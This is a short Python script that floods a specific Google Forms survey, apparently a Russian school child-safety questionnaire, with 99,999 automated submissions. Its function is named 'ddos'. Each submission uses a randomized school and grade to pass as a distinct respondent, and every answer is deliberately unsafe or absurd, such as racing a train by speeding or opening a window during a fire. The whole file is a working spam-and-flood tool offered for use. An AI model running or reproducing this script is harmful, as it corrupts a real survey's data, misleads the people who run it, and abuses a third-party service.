import requests
from random import randint



url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSeCEuIpS34v6zzlW-YX6KyIahPCdKhqVuk0w4LsEI1NRpZ3Nw/formResponse'

data = {
    'entry.1101681902': 'МБОУ СОШ № ' + str(randint(1,11)),
    'entry.571663010': randint(1,11),
    'entry.2046558936': 'Добавлю громкость в наушники - с музыкой веселее!',
    'entry.366340186': 'Нет, на железной дороге нельзя играть с собакой, нужно играть в футбол.',
    'entry.818484835': 'Если хорошенько надавить на газ - можно успеть!',
    'entry.1873367235': 'Да, игра важнее.',
    'entry.2143854565': 'Позвоню однокласснику и спрошу, что можно выпить.',
    'entry.1161108977': 'Радостно открою дверь, а вдруг это курьер, который  принес мою новую видеоигру.',
    'entry.474696161': 'Да,  вдруг они найдут клад.',
    'entry.1644373775': 'Всегда ходить без головного убора, нырять, где хочешь,  заплывать подальше.',
    'entry.759506263': 'Да – это весело!',
    'entry.1824903458': 'Ногой аккуратно отодвину провод и продолжу играть.',
    'entry.1939830847': 'Да, он может достать игрушку сам.',
    'entry.1983857356': 'Да, правильно.',
    'entry.656673699': 'Потому что они держаться за руки.',
    'entry.294106721': 'Разрешено кататься только на дороге, среди транспортного средства.',
    'entry.1800049640': 'Да можно, игры не будут мешать движению машин.',
    'entry.541662208': 'Открыть окно.',
    'entry.417942893': 'Найти источник дыма и устранить его;',
    'entry.1101681902_sentinel': None,
    'entry.571663010_sentinel': None,
    'entry.2046558936_sentinel': None,
    'entry.366340186_sentinel': None,
    'entry.818484835_sentinel': None,
    'entry.1873367235_sentinel': None,
    'entry.2143854565_sentinel': None,
    'entry.1161108977_sentinel': None,
    'entry.474696161_sentinel': None,
    'entry.1644373775_sentinel': None,
    'entry.759506263_sentinel': None,
    'entry.1824903458_sentinel': None,
    'entry.1939830847_sentinel': None,
    'entry.1983857356_sentinel': None,
    'entry.656673699_sentinel': None,
    'entry.294106721_sentinel': None,
    'entry.1800049640_sentinel': None,
    'entry.541662208_sentinel': None,
    'entry.417942893_sentinel': None,
    'fvv': '1',
    'draftResponse': '[null,null,"5033669525201803593"]',
    'pageHistory': '0',
    'fbzx': '5033669525201803593',
}
def ddos(url):
    for i in range(99999):
        r = requests.post(url, data=data)
        print(str(i) + ' ' + str(r.status_code))

if __name__ == '__main__':
    ddos(url)
